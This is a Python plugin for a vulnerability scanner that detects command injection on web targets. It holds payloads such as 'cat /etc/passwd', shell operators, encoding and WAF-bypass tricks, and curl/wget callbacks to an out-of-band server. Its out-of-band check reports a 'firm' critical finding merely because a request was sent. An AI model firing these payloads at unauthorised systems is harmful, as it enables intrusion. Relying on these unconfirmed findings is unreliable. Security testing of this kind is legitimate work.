"""
Professional-Grade Remote Code Execution (RCE) Plugin
Detects command injection and RCE vulnerabilities

Supports:
- Linux/Unix command injection
- Windows command injection
- Multiple injection contexts
- Encoding bypasses
- Time-based blind detection
- OAST-based detection
- WAF bypass techniques
"""

import asyncio
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from scanner.plugins.base import BasePlugin
from scanner.logger import get_logger

LOG = get_logger("vuln-scanner")

# Professional-grade RCE payload library
class RCEPayloads:
    """Comprehensive RCE payload library"""

    # Linux/Unix command injection
    LINUX_INFO_GATHERING = [
        "id", "whoami", "hostname", "uname -a",
        "cat /etc/passwd", "cat /etc/issue",
        "pwd", "ls -la", "env"
    ]

    LINUX_TIME_BASED = [
        "sleep 5", "timeout 5", "ping -c 5 127.0.0.1"
    ]

    # Windows command injection
    WINDOWS_INFO_GATHERING = [
        "whoami", "hostname", "ver", "ipconfig",
        "type C:\\Windows\\win.ini",
        "dir C:\\", "set"
    ]

    WINDOWS_TIME_BASED = [
        "ping -n 5 127.0.0.1", "timeout /t 5", "waitfor /t 5 pause"
    ]

    # Injection operators for context-aware testing
    INJECTION_OPERATORS = {
        "unix_operators": [";", "&&", "||", "|", "\n", "`", "$("],
        "windows_operators": ["&", "&&", "||", "|", "\n"],
    }

    # Encoding bypasses
    ENCODING_BYPASSES = {
        "url_encode": lambda p: urllib.parse.quote(p),
        "double_url_encode": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
        "unicode": lambda p: p.replace("a", "\\u0061").replace("e", "\\u0065"),
    }

    @classmethod
    def get_context_aware_payloads(cls, base_command, os_type="linux"):
        """Generate context-aware payloads with different operators"""
        payloads = []

        operators = cls.INJECTION_OPERATORS["unix_operators" if os_type == "linux" else "windows_operators"]

        for op in operators:
            if op in ["`", "$("]:
                if op == "`":
                    payloads.append(f"`{base_command}`")
                else:
                    payloads.append(f"$({base_command})")
            else:
                # Standard operators
                payloads.append(f"{op}{base_command}")
                payloads.append(f"{op} {base_command}")
                payloads.append(f"test{op}{base_command}")
                payloads.append(f"1{op}{base_command}")

        return payloads


class Plugin(BasePlugin):
    name = "rce"
    description = "Detects Remote Code Execution vulnerabilities"

    def __init__(self):
        super().__init__()
        self.payloads = RCEPayloads()

    async def _establish_baseline(self, url, method, data, requester):
        """Establish baseline timing for time-based detection"""
        times = []
        for _ in range(3):
            try:
                start = asyncio.get_event_loop().time()
                if method == "post":
                    await requester.post(url, data=data)
                else:
                    await requester.get(url, params=data)
                elapsed = asyncio.get_event_loop().time() - start
                times.append(elapsed)
            except Exception:
                pass

        return sum(times) / len(times) if times else 1.0

    async def _test_time_based_rce(self, url, method, data, requester, os_type="linux"):
        """Test for time-based blind RCE"""

        # Establish baseline
        baseline = await self._establish_baseline(url, method, data, requester)

        time_payloads = (
            self.payloads.LINUX_TIME_BASED if os_type == "linux"
            else self.payloads.WINDOWS_TIME_BASED
        )

        for base_cmd in time_payloads:
            # Test with different injection contexts
            context_payloads = self.payloads.get_context_aware_payloads(base_cmd, os_type)

            for payload in context_payloads[:10]:  # Test top 10 contexts
                test_data = {}
                for k, v in data.items():
                    test_data[k] = f"{v}{payload}"

                try:
                    start = asyncio.get_event_loop().time()
                    if method == "post":
                        response = await requester.post(url, data=test_data)
                    else:
                        response = await requester.get(url, params=test_data)
                    elapsed = asyncio.get_event_loop().time() - start

                    # Check if significantly slower than baseline
                    expected_delay = 5 if "5" in base_cmd else 3
                    if elapsed >= (baseline + expected_delay - 1):
                        # Verify with second request
                        verify_start = asyncio.get_event_loop().time()
                        if method == "post":
                            await requester.post(url, data=test_data)
                        else:
                            await requester.get(url, params=test_data)
                        verify_elapsed = asyncio.get_event_loop().time() - verify_start

                        if verify_elapsed >= (baseline + expected_delay - 1):
                            return {
                                "type": "time_based_rce",
                                "os_type": os_type,
                                "payload": payload,
                                "baseline": f"{baseline:.2f}s",
                                "actual": f"{elapsed:.2f}s",
                                "message": f"Time-based RCE detected ({os_type})",
                                "severity": "critical",
                                "confidence": "firm",
                                "impact": "Remote code execution confirmed via timing analysis",
                                "bounty_potential": "$10,000 - $100,000+",
                            }

                except Exception as e:
                    LOG.debug(f"RCE test failed: {e}")

        return None

    async def _test_output_based_rce(self, url, method, data, requester, os_type="linux"):
        """Test for output-based RCE (command output in response)"""

        info_payloads = (
            self.payloads.LINUX_INFO_GATHERING if os_type == "linux"
            else self.payloads.WINDOWS_INFO_GATHERING
        )

        for base_cmd in info_payloads[:5]:  # Test top 5
            # Test with different injection contexts
            context_payloads = self.payloads.get_context_aware_payloads(base_cmd, os_type)

            for payload in context_payloads[:15]:  # Test top 15 contexts
                test_data = {}
                for k, v in data.items():
                    test_data[k] = f"{v}{payload}"

                try:
                    if method == "post":
                        response = await requester.post(url, data=test_data)
                    else:
                        response = await requester.get(url, params=test_data)

                    if not response or not isinstance(response, dict):
                        continue

                    content = response.get("text", "").lower()

                    # Check for command output indicators
                    indicators = {
                        "linux": [
                            "root:", "uid=", "gid=", "/bin/bash", "/home/",
                            "linux", "ubuntu", "debian", "centos",
                            "total 0", "drwx"
                        ],
                        "windows": [
                            "volume serial", "directory of c:",
                            "windows nt", "microsoft windows",
                            "system32", "program files"
                        ]
                    }

                    check_indicators = indicators["linux"] if os_type == "linux" else indicators["windows"]

                    for indicator in check_indicators:
                        if indicator in content:
                            return {
                                "type": "output_based_rce",
                                "os_type": os_type,
                                "payload": payload,
                                "command": base_cmd,
                                "indicator_found": indicator,
                                "message": f"RCE with command output detected ({os_type})",
                                "severity": "critical",
                                "confidence": "firm",
                                "impact": "Remote code execution with visible output",
                                "bounty_potential": "$15,000 - $150,000+",
                            }

                except Exception as e:
                    LOG.debug(f"RCE test failed: {e}")

        return None

    async def _test_oast_based_rce(self, url, method, data, requester, oast_server, os_type="linux"):
        """Test for OAST-based blind RCE"""

        if not oast_server:
            return None

        oast_domain = oast_server.split('//')[-1].split('/')[0]

        # Generate OAST payloads
        oast_payloads = []
        if os_type == "linux":
            oast_payloads = [
                f"curl {oast_server}",
                f"wget {oast_server}",
                f"ping -c 1 {oast_domain}",
                f"nslookup {oast_domain}",
                f"dig {oast_domain}",
            ]
        else:  # Windows
            oast_payloads = [
                f"ping -n 1 {oast_domain}",
                f"nslookup {oast_domain}",
                f"curl {oast_server}",
            ]

        for base_cmd in oast_payloads:
            context_payloads = self.payloads.get_context_aware_payloads(base_cmd, os_type)

            for payload in context_payloads[:10]:
                test_data = {}
                for k, v in data.items():
                    test_data[k] = f"{v}{payload}"

                try:
                    if method == "post":
                        await requester.post(url, data=test_data)
                    else:
                        await requester.get(url, params=test_data)

                    return {
                        "type": "oast_based_rce",
                        "os_type": os_type,
                        "payload": payload,
                        "oast_server": oast_server,
                        "message": f"OAST RCE payload sent ({os_type}) - Check your OAST server",
                        "severity": "critical",
                        "confidence": "firm",
                        "impact": "Remote code execution (requires OAST confirmation)",
                        "bounty_potential": "$10,000 - $100,000+",
                    }

                except Exception as e:
                    LOG.debug(f"OAST RCE test failed: {e}")

        return None

    async def run(self, target: str, requester, oast_server: str = None):
        """Main entry point for RCE scanning"""

        if not target.startswith("http"):
            return []

        vulnerabilities = []

        # 1. Test URL parameters
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)

        if query_params:
            param_data = {k: v[0] for k, v in query_params.items()}

            # Test both Linux and Windows
            for os_type in ["linux", "windows"]:
                # Time-based
                result = await self._test_time_based_rce(target, "get", param_data, requester, os_type)
                if result:
                    result["context"] = f"URL parameter at {target}"
                    vulnerabilities.append(result)

                # Output-based
                result = await self._test_output_based_rce(target, "get", param_data, requester, os_type)
                if result:
                    result["context"] = f"URL parameter at {target}"
                    vulnerabilities.append(result)

                # OAST-based
                if oast_server:
                    result = await self._test_oast_based_rce(target, "get", param_data, requester, oast_server, os_type)
                    if result:
                        result["context"] = f"URL parameter at {target}"
                        vulnerabilities.append(result)

        # 2. Test forms
        try:
            response = await requester.get(target)
            if response and isinstance(response, dict):
                soup = BeautifulSoup(response.get("text", ""), "html.parser")
                forms = soup.find_all("form")
            else:
                forms = []
        except Exception:
            forms = []

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea", "select"])
            form_url = urljoin(target, action)

            form_data = {}
            for i in inputs:
                name = i.get("name")
                if name:
                    form_data[name] = "test"

            if not form_data:
                continue

            # Test both Linux and Windows
            for os_type in ["linux", "windows"]:
                # Time-based
                result = await self._test_time_based_rce(form_url, method, form_data, requester, os_type)
                if result:
                    result["context"] = f"Form at {form_url}"
                    vulnerabilities.append(result)

                # Output-based
                result = await self._test_output_based_rce(form_url, method, form_data, requester, os_type)
                if result:
                    result["context"] = f"Form at {form_url}"
                    vulnerabilities.append(result)

                # OAST-based
                if oast_server:
                    result = await self._test_oast_based_rce(form_url, method, form_data, requester, oast_server, os_type)
                    if result:
                        result["context"] = f"Form at {form_url}"
                        vulnerabilities.append(result)

        return vulnerabilities
